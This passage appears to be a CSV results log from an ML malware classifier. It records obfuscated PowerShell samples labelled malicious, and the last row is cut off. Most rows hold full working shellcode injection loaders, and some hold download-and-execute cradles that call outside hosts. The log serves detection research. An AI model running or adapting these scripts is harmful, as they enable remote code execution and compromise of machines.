'pL','tm','rsCDZN2349','Ct);','alCDZ','object ','tC:CDZ','t-Process -Fi','CD','tials ','ataCDZLocalCD','; W','8CD','CDZA','CDZrun32.','LCtC:CDZUse','Zru','.com','.e','oxy]::GetDefaultPr','a','yTwp=','/LC','Use','WyTwp','= WyTtru','ZTempCDZ','98CDZAp','le(LCth','em.ne','=new-','2.exe.','WyT','l','wc.pro','n3','Net.WebClient; W','x','ru','tps://wildfire.paloaltonetworks','T','faultCreden','Zrun32.e','xy =','blicapi/test/p','eLCt -NoNewWindow;','m LCtC','ataCDZLocalCDZTemp','pu','CtC:C','oa','t','LCt L','t.WebPr',' WyT','lCDZT','yTwc.Down','e.','De','dFi','TempCD','exeL','ath LC','ZA','ers','[s','n3','p','D','ZN234',' ','pD',' rename','Ct; Star','leP','oxy(); Wy','taCDZLoca','/','empC','e;','D','pp','e','DZN23498',':CDZUs','tm','2','wp.Use','x','yst','ZAppD','DZUsersC','rsCDZN23498C','wc','-ite','ppDataCDZLoc','t, ','D'))-RePlaCe  ([ChAR]76+[ChAR]67+[ChAR]116),[ChAR]39 -CrEplace  'WyT',[ChAR]36  -CrEplace([ChAR]67+[ChAR]68+[ChAR]90),[ChAR]92) |&amp;( $sHelLId[1]+$shellid[13]+'X')",malicious,TP
2026-07-13 17:19:23,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\444.ps1,custom-ps-ml,UNKNOWN,16180e8b-5dd7-4c1b-91d2-a7dabda181e5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3530,1788.56," .( $VERboSepRefeReNcE.TOsTring()[1,3]+'x'-jOin'') ( ((\""{40}{21}{12}{4}{16}{7}{50}{46}{29}{1}{23}{56}{15}{27}{37}{53}{8}{34}{33}{49}{11}{54}{47}{19}{20}{3}{28}{5}{43}{45}{48}{24}{14}{31}{32}{55}{42}{26}{9}{44}{52}{39}{57}{51}{10}{35}{30}{25}{13}{17}{22}{0}{58}{41}{2}{38}{18}{36}{6}\""-f 'ing([S','x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x52','n7-enc Gn7;if([IntPtr]::Size -eq 8){1aA3 = 1aAenv:SystemRoot + Gn7m46syswow64m',',0x9','tern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntP','0x5e,0xe2,0xce,0x95,0x33,0x5','hellGn7;iex Gn7&amp; 1aA3 1aA2 1aAeGn7}else{;iex Gn7&amp; powershell 1aA2 1aAeGn7;}',' static extern In','85,0x24,0x96,0x57,0xb6,0x15,0xb9,0xdb,0xc5,0x49,0x19,0xe5,0x05,0x9c','xa7,0x77,0xde,0x01,0x08,0x77,0x1e,0x51,0x1e,0x1f,0x0c,0xc3,0x17,0x3d,0xcf,0x3e','{1aA','0x','7)]public static ex','lloc(0,0x1000,1aAg,0x40);for (1aAi=0;1aAi -le (1aAz.Length-1);1aAi++) {1aAw::memset([IntPtr](1aAx.ToInt32()+1aAi), 1aAz[1aAi], ','x1d,0x',',0x7c,0x0d,0xc2,0xd7,0xe1,0x87,0x27,','tr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Gn7msvcrt.dllGn7)]public','1)};1aAw::CreateThread(0,0,1aAx','w','19,0xa0,0x49,0x28,0x12',',0xdc,0xc2,0xcf,0xf4,0x54,0x90,0xeb,0xd0,0x3d,0x42,0x95,0x41,0x98,0x25,0xaa,0x91,0x43,0x99,0x0e,0xda,0x6e,0xce,0x22,0x81,0xe6,0x7e,0x58,0x4d,0xf7,0x16,0xd5,0xc4',' uint flAllocationType, uint flProtect);[DllImport(Gn7kernel32.dllGn',',0,0,0);for (;;){Start-sleep 60};TVa;1aAe = [System.Convert]::ToBase64Str',',0x31,0x5a,0x12,0x03,0x5a,0x','x58,0x2d,0x9c,0x63,0x13,0x75,0x88,0x6b,0xf3,0','x=1aAw::VirtualA','0,0x0a,0x95,0xe5,0x80,0xca,0xfd,0x05,0x80,0x8a,0xfd,0x56,0xe8,0x52,0x5a,0x0b,0x0d,0x9d,0x77,0x3f,0x9e,0x31,0xf1,0','0xe6,0x21,0xf3,0x2c,0x59,0','9,0x8f,0x4d,0x7e,0x2a,0x27,0x48,0x79,0x4d,0x12,0xa5,','d9,0','z.Length};1aA','67,0xe5,0x6c,0x1b,0x78,0x','20,0x1b,0x62,0xd4,0xa3,0x1b,0x69,0xbb,0xb7,0x48,0x3e,0x68,0xef,0x3d,0x96,0xe6,0xe4,0x94,0x38,0xcc,0x05,0xc3,0xd3,0x58,0xf0,0xb4,0x88,0xcf,0x57,0',',0xf7,0xc0,0xbc,0x88,0x42,0xd9,0x37,',',0x58,0x22,0x7b,0x6d,0x08,0xfb','g = 1aA','ers','x92,0x77,0x60,0x56,0x5','46WindowsPowerShellm46v1.0m46po','91,0xf4,0x83,0xe0,0x93,0x32,0x49,0x31,0xe3,0x71,0x9f,0x7e,0x3c,0x5b,0xe7,0xb1,0x42;1a','1aA1 = TVa1aAc = TVaTVa[DllImport(Gn7kernel32.dllGn7)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,','GetBytes(1aA1));1aA2 = G','d,0x23,0x7a,0x76,0x18,0x13,0xf1,0x72,0x6c,0xe1,0x17,0xea,0x82,0xbc,0x4a,0xbc,0x9d,0x6a,0xe0,0x0','6,0x99,0x23,0xe5,0x21,0xfe,0xab,0xd',',0xa2,0x01,0x4','c,0x81,0x53,0x3e,0xdd,0x7','Definition 1aAc -Name Gn7Win32Gn7 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]1aAz = 0xbb,0x04,0xea,0x1c,0x18,0xda,0xc1,0x','0x4a,0x0d,0x14,0xe8,0xb6,0xaf,0xf9,0x6f,0x3d,0xa3,0xb6,0xe4,0x','6,0x07,0xd6,0x6e,0x68,0xa7,0x26,0x98,0xf1,0xa7,0x26,0','0xc2,0x43,0x59,0xa4,0x93,0x62,0x48,0x7b,0xaf,0x3c,0x4a,0x7a,0x7c,0x35,0xc3,0x64,0x61,0x70,0x9d,0x1f,0x51,0x0e,0x1c,0xc9,0xab,0xef,0xb3,0x34,0x04,0x02,0xcd,0x71,','tPtr memset(IntPtr dest, uint src, uint count);TVaTVa;1aAw = Add-Type -member','0x1000)','4,0x0c,0x26,0x86,0xa4,0x4d,0xbc,0x48,0xd3,0xb4,0xe7,0x8b,0x43,0xdf,0x','9,0xd5,0x90,0xed,0x2f,0xf2,0x97,0x46,0x','a3,0xfd,0xb8,0x8b,0xd7,0x80,0xba,0x48,0xa5,0x5e,0x4e,','x19,0x79,0x98,0x7a,0x9b,0x9','12,0x83,0xc6,0xee,0xfe,0xed,0x3a,0x06','Ag = 0x1000;if (1aAz.Length -gt ','ystem.Text.Encoding]::Unicode.')).replaCE('m46','\\').replaCE('TVa',[StrING][cHAr]39).replaCE(([cHAr]71+[cHAr]110+[cHAr]55),[StrING][cHAr]34).replaCE(([cHAr]49+[cHAr]97+[cHAr]65),'$') )",malicious,TP
2026-07-13 17:19:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\451.ps1,custom-ps-ml,UNKNOWN,769f7c16-1c95-4f7f-ae96-4925d30847b8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3046,1692.15," ieX ( ((\""{14}{49}{50}{42}{37}{13}{31}{6}{21}{20}{16}{7}{47}{44}{30}{5}{3}{32}{18}{28}{29}{46}{25}{4}{19}{26}{41}{27}{12}{36}{40}{10}{48}{38}{34}{17}{51}{0}{2}{8}{9}{39}{33}{23}{24}{43}{1}{11}{22}{45}{15}{35}\"" -f ',0x3c,0x72,0x37,0x10,0xb6,0xe3,0xb8,0x8e,0x',',0x2a','b2,0x23,0x32,0x3d,0x42,0xed,0xb3,0x48,0x50,0x99,0x33,0x07,0x0a,0x0f,0x4b,0xbd,0x21,0xaf,0xd9,0x3a,0xe0,','a,0xdc,0x0a,0x4a,0','0xf6,0x85,0x61,0x7b,0xa0,0x61,0x90,0xa8,0x37,0xe1,0x9e,0x05,0x33,0xad,0x82,0x','f,0x88,0xf5,0xf2,0x84,0xd9,0xa5,0xc2,0xcf,0x8c,0x49,0xa8,0x82,0x24,0xd','rotect);[DllImport(qrjkernel32.dllqrj)]public static extern I','blic static extern IntPtr memset(IntPtr dest, uint src, uint count);syi;bVZw = Add-Type -memberDefinition bVZabqS -Name qrjWin32qrj -namespace Win32Functions -passthru','0xf8,0x75,0x41,0xd5,0xce,','0xd9','0,0x2b,0xf7,0x7d,0x0b,0x44,0x10,0x90,0xb3,0x6b,0xe1,0xf7,0xd7,0x04,0x92,0xc3,0x27,0xeb,0x7a,0x48,0',',0x8d,0xaf,0xcc,0x34,0x18,0xdc,0x5d,0xa1,0xa3,0xb5,0x3','x7e,0xd9,0xf6,0xbf,0xab,0x4e,0xa7,0x','dwSize, uint flAllocation','bVZabqS = syi[DllIm',';bVZAi4=bVZw::Virt','int dwCreationFlags, IntPtr lpThreadId);[DllImport(qrjmsvcrt.dllqrj)]pu',',0x46,0x78,0x41,0x94,0x03,0x7a,0x11,0xcc,0xd1,0x84,0x8','e0,0x34,0xb2,0x11,0x15,0','98,0x90,0xc5,0xbe,0x11,0x17,0x0a,0x37,0x61,0x3c,0x8e,0x1c,','lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, u','ntPtr CreateThread(IntPtr ','2,0x62,0xcc,0x3b,0x6d,0x44,0x53,0xc3,0x58,0x54,0xaf,0x12,0xa4,0x22,0xc1,0xa6;bVZg = 0x1000;if (bVZz.Length -gt 0x1000){bVZg','x2e,0xfb,0x31,0x1c,0xbf,0xf','b,0xc1,0x4a,0x','d9,0xba,0x33,0x73,0x1e,0xc1,0xef,','0x31,0','6,0x11,0x44,0x53,0xa9,0x62,0x4c,0x97,0xfd,0x32,0xe6,0x3e,0','x8c,0xb5,0x30,0x88,0x87,0xef,0x92,0x2a,0x44,0x84,0x9a,0x34,0x89,0xa1,0x55,0xce,0x79,0x5d,0x64,0x06,0x','b0,0x9e,0xc','xc9,0xb1,0x4e,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xdc,0x8f,0x95,0x8c,0x34,0xcd,0x56,0x6d,0xc4,0xb2,0xd','Type, uint flP','x6b,0x6a,0x6d,0x65,0x6c,0xc7,0x4d,0xe4,0xee,0x1a,0x82,0xc6,0xcf,0xd4,0xd7,0x07,0x08,0x08,0x15,0x55,0xc1,0x46,0x88,0x4a,0x66,0x12,0x11,0x','xd3,0',',0x77','ualAlloc(0,0x1000,bVZg,0x40);for (bVZi=0;bVZi -le (bVZz.Length-1);bVZi++) {bVZw::memset([IntPtr](bVZAi4.ToInt32()+bVZi), bVZz[bVZi], 1)};bVZw::CreateThread(0,0,bVZAi4,0,0,0);for (;;){Start-sleep 60};','6f,0x04,0x2f,0x17,0xcf,0xf',' uint ','e,0xc5,0x1c,0x82,0xbe,0x71,0x76,0x42,0x8b,0x01',',0xba,0x30,0x45,0','4,0xc7,0x7d,0xc','x5d,0x97,0xf8,0x94,0x62,0xc7,0xa3,0x49,0xc7,0x83,0x49,0x9d,0x7a,0xce,0x05,0x52,0xb7,0xf1,0xd5,0xfc,0xc0,0x82,0xe7,0xa3,0x7a,0x0d,0x4b,0x2b,0xa5,0xca,0xac,0x0','Alloc(IntPtr lpAddress,','d5,0xfb,0xa9','= 0xbe,0xd8,0x6d,0x60,0x70,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x29,0',' = bVZz.Length}','b,0x67,0x7d,0x6d,0x15,0xaf,0xb9,0x8e,0x60,0x',';[Byte[]];[Byte[]]bVZz ','x23,0x65,0xf0,0xb','port(qrjkernel','32.dllqrj)]public static extern IntPtr Virtual','e,0x9d,0x5f,0x62,0xda,0x8d,0x09')).REPlacE(([cHAr]113+[cHAr]114+[cHAr]106),[STRiNg][cHAr]34).REPlacE(([cHAr]115+[cHAr]121+[cHAr]105),[STRiNg][cHAr]39).REPlacE('bVZ','$') )",malicious,TP
2026-07-13 17:19:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\452.ps1,custom-ps-ml,UNKNOWN,1e6e83e0-b429-4b7f-8149-b3e4988cfee4,DESKTOP-BAC9DBQ,malicious,0.8374,RandomForest,3006,1567.82,"&amp; ((GV '*mDR*').name[3,11,2]-jOiN'') ((((\""{44}{47}{61}{52}{69}{49}{42}{54}{58}{20}{66}{38}{30}{17}{15}{45}{59}{55}{0}{11}{56}{36}{51}{53}{14}{34}{48}{65}{6}{50}{32}{23}{8}{22}{31}{37}{41}{3}{12}{35}{1}{33}{62}{39}{19}{60}{7}{10}{21}{43}{4}{57}{29}{28}{40}{25}{70}{26}{67}{2}{24}{27}{64}{18}{63}{13}{5}{68}{9}{16}{46}\"" -f'ace Win32Functions -passthru;[Byte[]];[Byte[]]aOLz = 0xfc,0x','68,0x77',',0x56,0x53,0x57,0x','0xd0,0x89,0x44,','x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,','lloc(0,0x1000,aOLg,0x40);for (aOLi=0;aOLi -l','x01,0xd3,0x8b,0x49,0x1',',0x89,0xe6,0x6a,0x10,','01,0xc7',':memse','0x56,0x57,','e8,0x82','0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d','Lx=aOLw::VirtualA','0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,','-','t([IntPtr](aOLx.ToInt32()+aOLi), aOLz[aOLi], 1)};aOLw::CreateThread(0,0,aOLx,0,0,0);for (;;){Start-s',' Add-Type -memberDefinition aOLc ','x00,0x53,0xff,0xd5;aOLg = 0x1000;if (aOLz.Length -gt 0x1000){aOLg','xd5,0x',')]publ','0x68,0x99,0xa5',',0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7','0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x','68,0x02,0xd9,0xc8,0x5f,0xf','x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0x','d5,0x93,0x53,0x','f,0xd5,0','x83,0xf8,0x','0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','Ptr dest, uint src, uint count);wIu;aOLw =','d,0x24,','b,0x01,',',0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,','0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x',',0x68,0x33,0x32,0x00,0x00,0x','xc0,0x64,0x8b,0x50,0x','0x75,0xe4,0x',' extern IntPtr memset(Int','80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0','00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0','58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,','6kernel32.dllSg6)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, Int',',0x74,0x61,0xff,0xd5,0x85,0xc0,0','aOLc = wIu[DllImport(Sg6kernel32.dllSg6)]public static extern IntPt','Name','leep 60};','r VirtualAlloc(IntPtr lpAddress, uin','48,0','int flProtect);[DllImport(Sg','8,0xe3,0x3a,0x49,0x8b,0x34,0x8','30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,','e, uint flAlloca','0xb7,0x4a,','Ptr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(S','p',',0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0','0x00,0x00,0x00,0x6a,','g6msvcrt.dllSg6',' Sg6Win32Sg6 -names','97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x1f,0x90','t dwSiz','0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x',' = aOLz.Length};aO','x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0','x01,0xd1,0x51,0x8b,0x59,0x20,0','ic static','6a,0x00','e (aOLz.Length-1);aOLi++) {aOLw:','tionType, u','e5,0xff,0x')) -cREPLaCe  ([ChAr]119+[ChAr]73+[ChAr]117),[ChAr]39-cREPLaCe ([ChAr]97+[ChAr]79+[ChAr]76),[ChAr]36  -rEpLacE  'Sg6',[ChAr]34))",malicious,TP
2026-07-13 17:19:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\454.ps1,custom-ps-ml,UNKNOWN,85e77486-76f2-4501-be8e-7e1b4a2d58fe,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2767,1642.72," ((\""{42}{0}{25}{45}{20}{7}{3}{4}{35}{17}{13}{40}{11}{36}{10}{29}{2}{12}{15}{34}{24}{30}{1}{8}{6}{26}{31}{44}{46}{32}{9}{16}{19}{18}{27}{33}{14}{41}{21}{43}{39}{28}{22}{38}{23}{5}{37}\""-f 'tualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationTyp',',0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73','0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x','static extern IntPtr',' CreateThread(IntPtr lpThreadAttributes, uint dwStackSi','Zw::memset([IntPtr](WzZ','0x90,0x01','c ',',0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,',',0x56,0x5','0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c','xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0','59,0x20,0x01,0',' -Name n1OWin32n1O -namespace Win32Functions -passthru;[Byte[]];[Byte[]]WzZz = 0xfc,0xe8,0x86,0x00,0x00,',',0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4','xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,','7,0x68,0x99,0xa5','zZw = Add-Type -memberDefinition WzZc','x0c,0xff,0x4e,0x08,0x',',0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0','1Okernel32.dlln1O)]publi','0,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;WzZg = 0x1000','Zz.Length};WzZx=WzZw::VirtualAlloc(0,0x1000,WzZg','1);WzZi++) {Wz',',0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24','e, uint flPr',',0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80','75,0xec,0','Wz',',0x8b,0x4c,',',0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f',',0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,',',0xe6,0x6a,0x10','x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b','0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01','ze, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(n1Omsvcrt.dlln1O)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);2YK;W','x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x','x.ToInt32()+WzZi), WzZz[WzZi], 1)};WzZw::CreateThread(0,0,WzZx,0,0,0);for (;;){Start-sleep 60};',',0x40);for (WzZi=0;WzZi -le (WzZz.Length-','= ','0x00,0x60,0x89,0',',0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0','WzZc = 2YK[DllImport(n1Okernel32.dlln1O)]public static extern IntPtr Vir',';if (WzZz.Length -gt 0x1000){WzZg ','0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6f,0x60,0xee,0x68,0x02,0x00,0x01,0xbb,0x8','otect);[DllImport(n','9')).REPlace('2YK',[string][chAr]39).REPlace(([chAr]110+[chAr]49+[chAr]79),[string][chAr]34).REPlace('WzZ',[string][chAr]36)|&amp;( $ShelLid[1]+$shellID[13]+'x')",malicious,TP
2026-07-13 17:19:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\476.ps1,custom-ps-ml,UNKNOWN,985add51-f53e-48ea-b6e3-da97f2587429,DESKTOP-BAC9DBQ,malicious,0.9455,RandomForest,363,1659.05,". ((varIaBlE '*mDR*').NaME[3,11,2]-JOiN'') ((((\""{21}{16}{10}{9}{8}{11}{5}{0}{19}{20}{6}{4}{2}{17}{22}{7}{13}{1}{12}{15}{3}{14}{18}\""-f 'ne','irect','g({0}http://googl','0','strin','}IEX ((','ient).download','ps.','-w hidd',' -nop ','e','en -c {1','m','red','80/{','e.net:8','hell.ex','e-m','0})){1}','w-o','bject net.webcl','powers','a')) -F  [ChAr]39,[ChAr]34))",malicious,TP
2026-07-13 17:20:13,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\481.ps1,custom-ps-ml,UNKNOWN,83192e42-ac25-4164-9870-8b43b7509dda,DESKTOP-BAC9DBQ,malicious,0.9538,RandomForest,3452,1554.63," &amp;((gV '*mDr*').namE[3,11,2]-JOin'')(((\""{81}{76}{21}{73}{67}{42}{40}{47}{70}{24}{69}{50}{7}{6}{49}{52}{2}{72}{65}{1}{26}{46}{48}{4}{44}{53}{43}{39}{38}{63}{35}{58}{56}{74}{71}{45}{41}{78}{33}{68}{3}{51}{75}{13}{28}{27}{82}{23}{55}{30}{12}{59}{10}{0}{22}{16}{77}{62}{34}{54}{37}{79}{31}{14}{57}{25}{61}{20}{60}{17}{8}{15}{9}{66}{64}{29}{80}{11}{36}{19}{5}{32}{18}\"" -f',0xc3,0x8b,0xd9,0x48,0x4c,0x3d,0x78,0x00,0x','0x59,0x31,0x53,0x18,0x03,0x53,0x18,0x83,0xc3,0x1f,0xfd,0x5f,0x7f,0xcc,0xd8,0xd4,0xa4,0x06,0x61,0x90,0xaf,0xa9,0x7b,0xc1,0x9e,0xfc,0x35,0xa0,0xd1,0xa6,0x2c,0xc6,0xfa,0xaa,0x4c,0x90,0xef,0x34,0xac,0xd0,0x06,0xd1,0x5d,0x60,0x15,0x8d,0xb4,0x7b,0xb9,0x77,0x8b,0x4','D -namespace Win32Functions -p',',0x','26,0x19,0xed,0x1b,0x96,0x29,0x99,0x10,0x3a,0xd6,0xbc,0x26,0x08,0xa1,0x0f,0xa0','+) {QDFw::memset([IntPtr](QDFx.ToInt32()+QDF','int src, uint count);UqI;QDFw =','dest, u','da,0xd9,0x93,0x29,0x1d,0xef,0x8e,0x9',' 0x1000;if (QDFz.Lengt','x35','QD','d8,0x6b,0x95,0x13,0xeb,0xad,0x2d,0x37,0x6f,0x6e,0x9','0,0x77,0x','x7e,0x12,0x25,0x52,0x4b,0x19,','5,0x8d,0x80,0xa5,0xb5;QDFg =','d,0x36,0xc6,0x99,0x26,0x69,0x17','35,0x7a,0xbe,0xf9,0x15,0x31,0x','hread(0,0,QDFx,0,0,0);for (;;){Start-sleep 60};','i -le (QDFz.Length-1);QDFi+','x1','lpAddress, uint dwSize, uint flAllocationType, uint flP','2d,0x7','4,0xf5,0x68,0x0d,0xe8,0','meter, uint dwCreationF',',0x8d,0x52,0xef,0xd6,0x6e,0x19','e,0x1a,0x74,0xe3,0x',',','13,0xeb,0xc1','0','0xc4,0x','0xd5,0x8c,0xb0,0x70,0xf5,0','i), QDFz[QDFi], 1)};QDFw::CreateT','0xec,0x79,0x31,0xdf,',',0x11,0','5,0','Fi=0;QDF','xfd,0x18,0xbf,0x64,0xa9,0x',',0xba','1,0x06,0x98,0xcf,0xd6,0xba,0x66,0x2d','s, uint dwStackS',',0x1f,0x4b,0x71,0x7a','tPtr CreateThread(IntPtr lpThreadAttribute',',0xb7,0x4c,0xd2,0x18,0xfc,0x2e,0x1d,0x31,0xe2,0x2a,0x92,0xa',',0x82,0x7e,0x5b,0x37,0xfc,0xbd,0x63,0xea,0x46','05,0x7c,0x2a','aa,0x92,0x9c,0x70,0xae,0x1b,0xe','i','b,0xf0,0xd3,0xf8,0x6e,0x8c,0xd6,0x',' Add-Type -memberDef','tic extern IntPtr memset(IntPtr ','ed,0xd3,','inition QDFc -Name bGDWin32bG',',0x38,0xee,0xf6,0x40,0x73,0xd7,0xd0,0x11,0x22','xa3,0x9b,0','xf8,0x67,0xd2,',',0x1c,0x','0x63,0x18,0xb7,0xbc,0x00','x74,0xdc,0x8e','c,0xc0,0x5d,0x47,0x75,0x6e,0x45,0x6b,0x0c,0xf3,0xfb,0x81,0x1e,0x55,0x23,0x38,0xd4,0xc1,0x81,0xca,0','6,0x64,0xc6,0x91,0x',',0x6d,0','xdf,0xda,0xa2,0x64,0x60,0x2e,0x62,0x98,0x32',',0x39,0x52,0x10,0xf2,0xfa,0x50,0xb','DFz.Length};QDFx=QDFw::VirtualAlloc(',',0xd9,0x74,0x24,0xf4,0xba,0x1b,0x1f,0xaa,0xa5,0x5b,0x31,0xc9,0xb1,','h -gt 0x1000){QDFg = Q','n In','0xcf,0xac,0x60,0x9f,0x32,0x2d,0xc3,0x21,0x86,0xc9,0x3c,0x5e,0xf0,0x1a,0xe0,0x2f,0x98,0x52,0x5a,0x98,0xf2,0x2f,0xb9,0xf9,0xea,0x63,0x5f,0x09,0x0e','lags, IntPtr lpThreadId);[DllImport(bGDmsvcrt.dllbGD)]public sta','ze, IntPtr lpStartAddress, IntPtr lpPara','0x7f,0xe5,0x57,0x3d,0x','assthru;[Byte[]];[Byte[]]QDFz = 0xda,0xc6','rotect);[DllImport(bGDkernel32.dllbGD)]public static exter','21,0xe9,0xd6,0x45,0x92,0x31,0xce,0x00,0x66,0x50,','0xe8,0x1d,0xb9,0xb2,0x28,0x13,0x62,0x56,0x39,0x74,0xf8,0x8c,0x19,0x12,0x9f,0xf',')]public static extern IntPtr VirtualAlloc(IntPtr ',',0xb0,0xce,0x7c,0x32,0xb6,0x92,0x27,0xba,0xea,0xd5,0x92,0xfe,0xe5,0xf7,0x65,0x9b,0x9a,0xa7,0xee,0xd3,0x9a,0x6d,0xc6,0x0e,0x5b,0x11,0x36,0x72,0x4d,0x98,0x11,0',',0x45,','f2,0xd4,0x27,0xb3,',',0x1000,QDFg,0x40);for (','QDFc = UqI[DllImport(bGDkernel32.dllbGD','0x2b,0x48,0x1')).RePLacE('UqI',[sTRING][chAr]39).RePLacE('bGD',[sTRING][chAr]34).RePLacE('QDF','$') )",malicious,TP
2026-07-13 17:20:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\52.ps1,custom-ps-ml,UNKNOWN,821cab8a-da44-45bb-abb9-140543fdde83,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3550,1671.21," (((\""{8}{57}{55}{41}{15}{72}{45}{3}{33}{17}{52}{81}{77}{47}{32}{38}{50}{44}{5}{9}{35}{70}{2}{26}{62}{60}{22}{14}{28}{29}{27}{65}{58}{4}{20}{30}{21}{82}{68}{64}{69}{13}{40}{36}{10}{11}{0}{80}{46}{24}{56}{73}{79}{12}{31}{16}{67}{49}{19}{43}{54}{83}{48}{75}{59}{6}{7}{1}{78}{39}{42}{66}{74}{23}{76}{37}{61}{34}{63}{18}{25}{51}{71}{53}\""-f '1,0x39','0x2e,0xac,0x0e,0xee,0xc3,0x5',',0','ibutes, ui','x7d,0x42,0x66,0xe','0x9e,0x4c,','8,0x65,0xa3,0xbf,0x0a,0xe3,0xdc,0xbf,0x34,0','x62,0x4b,','Zsr6UhT = Hqk[DllImport(3TYkernel','0x5e,0','b,0x4f,0x6b,0x73,0x04,0xe7,0x9a,0x73,0x','d4,0x1f,0x10,0x73,0xd4,0xdf,0x06,0x42,0xe2,0xe7,0x17,0xc3,0x0a,0x47,0xc0,0x44,0x82,0xf8,0xd6,0x94,0x41,0x8f,0x1',',0x80,0x97,0xbe,0xa','9d,0x44,0xd','7,0x56,0xa5,0x2e,0x96,0xc9,0xbd,0x68,0x38,0xe8,0x12,0x01,0x71,0xf2,0x77,0x2c,0xcb,0x89,0x4c,0xda,0xc','Thre','1,0x57,0x01,0x9f,0x44,0x68,0x58,0xcc,0x1b,0xc4,0x31,0xa5,0x','set(IntPtr dest, uint src, uint count);Hqk;Zsrw = Add-Type -memberDefinition Zsr6UhT -Name 3TYWin323TY -namespace 